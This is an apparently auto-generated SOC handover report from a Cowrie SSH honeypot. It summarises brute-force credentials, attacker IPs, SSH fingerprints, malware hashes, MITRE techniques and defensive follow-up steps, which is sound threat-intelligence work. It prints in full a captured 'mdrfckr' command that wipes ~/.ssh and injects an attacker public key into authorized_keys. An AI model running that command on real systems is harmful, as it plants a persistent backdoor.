# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T04:22:14Z |
| **Shift Time** | 04:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **98** |
| Confirmed Threats | **46** |
| False Positives Filtered | **52** (53.1%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **13** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **93** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **33** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **25** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `ubnt` | 3 |
| `345gs5662d34` | 2 |
| `admin` | 2 |
| `mw` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `admin` | 2 |
| `mw` | 1 |
| `sshtunnel` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `mw` | `mw` | 1 |
| `sshtunnel` | `sshtunnel` | 1 |
| `sammy` | `sammy2026!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx001@@` | `197.199.224.52` | 2026-04-04T02:04:44 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-04-04T02:04:48 |
| `root` | `qw` | `197.199.224.52` | 2026-04-04T02:09:02 |
| `root` | `pass` | `179.43.186.241` | 2026-04-04T03:42:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **98** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 18 |
| libssh | 17 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 18 | 18 |
| `03a80b21afa8...` | Modern SSH client | 12 | 2 |
| `19532158b559...` | Mirai/variant | 2 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 18 | 18 | Mirai/variant |
| `03a80b21afa8...` | libssh | 12 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.199.224.52`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **29** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS24445` | Henan Mobile Communications Co.,Ltd | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS24186` | RailTel Corporation of India Ltd | 1 | HIGH |
| `AS45820` | Tata Teleservices ISP AS | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS17622` | China Unicom Guangzhou network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-532db25bc2da

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-04-04 02:04 |
| **Last Seen** | 2026-04-04 02:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 02:04:43` | `cowrie.session.connect` |
| `2026-04-04 02:04:43` | `cowrie.client.version` |
| `2026-04-04 02:04:43` | `cowrie.client.kex` |
| `2026-04-04 02:04:44` | `cowrie.login.success` |
| `2026-04-04 02:04:44` | `cowrie.session.params` |
| `2026-04-04 02:04:44` | `cowrie.command.input` |
| `2026-04-04 02:04:44` | `cowrie.command.failed` |
| `2026-04-04 02:04:44` | `cowrie.log.closed` |
| `2026-04-04 02:04:45` | `cowrie.session.params` |
| `2026-04-04 02:04:45` | `cowrie.command.input` |
| `2026-04-04 02:04:45` | `cowrie.session.file_download` |
| `2026-04-04 02:04:45` | `cowrie.log.closed` |
| `2026-04-04 02:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb212678ac4

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-04-04 02:04 |
| **Last Seen** | 2026-04-04 02:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 02:04:47` | `cowrie.session.connect` |
| `2026-04-04 02:04:47` | `cowrie.client.version` |
| `2026-04-04 02:04:47` | `cowrie.client.kex` |
| `2026-04-04 02:04:48` | `cowrie.login.success` |
| `2026-04-04 02:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f7ec09ca06

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-04-04 02:09 |
| **Last Seen** | 2026-04-04 02:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 02:09:01` | `cowrie.session.connect` |
| `2026-04-04 02:09:01` | `cowrie.client.version` |
| `2026-04-04 02:09:01` | `cowrie.client.kex` |
| `2026-04-04 02:09:02` | `cowrie.login.success` |
| `2026-04-04 02:09:02` | `cowrie.session.params` |
| `2026-04-04 02:09:02` | `cowrie.command.input` |
| `2026-04-04 02:09:02` | `cowrie.command.failed` |
| `2026-04-04 02:09:02` | `cowrie.log.closed` |
| `2026-04-04 02:09:03` | `cowrie.session.params` |
| `2026-04-04 02:09:03` | `cowrie.command.input` |
| `2026-04-04 02:09:03` | `cowrie.session.file_download` |
| `2026-04-04 02:09:03` | `cowrie.log.closed` |
| `2026-04-04 02:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292951f66da5

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-04-04 02:09 |
| **Last Seen** | 2026-04-04 02:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 02:09:05` | `cowrie.session.connect` |
| `2026-04-04 02:09:05` | `cowrie.client.version` |
| `2026-04-04 02:09:05` | `cowrie.client.kex` |
| `2026-04-04 02:09:06` | `cowrie.login.success` |
| `2026-04-04 02:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33134852d3ce

| Field | Detail |
|---|---|
| **Source IP** | `179.43.186[.]241` |
| **First Seen** | 2026-04-04 03:42 |
| **Last Seen** | 2026-04-04 03:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 03:42:09` | `cowrie.session.connect` |
| `2026-04-04 03:42:09` | `cowrie.client.version` |
| `2026-04-04 03:42:10` | `cowrie.client.kex` |
| `2026-04-04 03:42:10` | `cowrie.login.success` |
| `2026-04-04 03:42:10` | `cowrie.session.params` |
| `2026-04-04 03:42:10` | `cowrie.command.input` |
| `2026-04-04 03:42:10` | `cowrie.log.closed` |
| `2026-04-04 03:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.43.186[.]241` to AbuseIPDB if not already reported
- [ ] Block `179.43.186[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `18.218.118[.]203` | **6** | 2026-04-04 03:07 | 2026-04-04 03:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `197.199.224[.]52` | **6** | 2026-04-04 01:58 | 2026-04-04 02:09 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.100[.]92` | **3** | 2026-04-04 03:40 | 2026-04-04 03:43 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `45.194.37[.]246` | **2** | 2026-04-04 02:24 | 2026-04-04 02:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.92.145[.]107` | 1 | 2026-04-04 03:02 | 2026-04-04 03:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `103.250.160[.]76` | 1 | 2026-04-04 04:04 | 2026-04-04 04:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.155.27[.]128` | 1 | 2026-04-04 03:13 | 2026-04-04 03:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.133.244[.]240` | 1 | 2026-04-04 03:43 | 2026-04-04 03:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.94.5[.]43` | 1 | 2026-04-04 04:10 | 2026-04-04 04:10 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.159.174[.]136` | 1 | 2026-04-04 02:28 | 2026-04-04 02:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.194.50[.]39` | 1 | 2026-04-04 03:32 | 2026-04-04 03:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.194.228[.]129` | 1 | 2026-04-04 03:54 | 2026-04-04 03:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `182.75.227[.]178` | 1 | 2026-04-04 02:46 | 2026-04-04 02:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.106.59[.]245` | 1 | 2026-04-04 02:54 | 2026-04-04 02:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.236[.]23` | 1 | 2026-04-04 02:08 | 2026-04-04 02:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-04-04 03:06 | 2026-04-04 03:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.149.191[.]246` | 1 | 2026-04-04 02:47 | 2026-04-04 02:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.98[.]26` | 1 | 2026-04-04 03:26 | 2026-04-04 03:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.26.218[.]190` | 1 | 2026-04-04 04:15 | 2026-04-04 04:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]56` | 1 | 2026-04-04 02:28 | 2026-04-04 02:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.12.84[.]172` | 1 | 2026-04-04 02:15 | 2026-04-04 02:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.169.6[.]99` | 1 | 2026-04-04 02:27 | 2026-04-04 02:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.78.98[.]181` | 1 | 2026-04-04 02:27 | 2026-04-04 02:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `62.192.226[.]83` | 1 | 2026-04-04 02:07 | 2026-04-04 02:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-04-04 02:32 | 2026-04-04 02:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.68.39[.]38` | 1 | 2026-04-04 03:24 | 2026-04-04 03:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-04-04 03:51 | 2026-04-04 03:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.161.217[.]228` | 1 | 2026-04-04 03:05 | 2026-04-04 03:07 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.171.236[.]23` | MY | Celcom Axiata Berhad | **100** ⚠️ | 13 |
| `61.169.6[.]99` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `175.194.228[.]129` | KR | Korea Telecom | **100** ⚠️ | 11 |
| `179.43.186[.]241` | CH | PRIVATE LAYER INC | **100** ⚠️ | 15 |
| `62.192.226[.]83` | RU | Arkhangelsk Television Company | **100** ⚠️ | 50 |
| `183.106.59[.]245` | KR | Korea Telecom | **100** ⚠️ | 41 |
| `117.159.174[.]136` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `1.92.145[.]107` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 0 |
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 16 |
| `120.194.50[.]39` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (52 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 26 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 98 cases |
| Tool 34  | Credential Extractor        | ✅ 33 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 52 filtered (53.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 28 recon entry/entries in table (4 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T04:22:14Z_
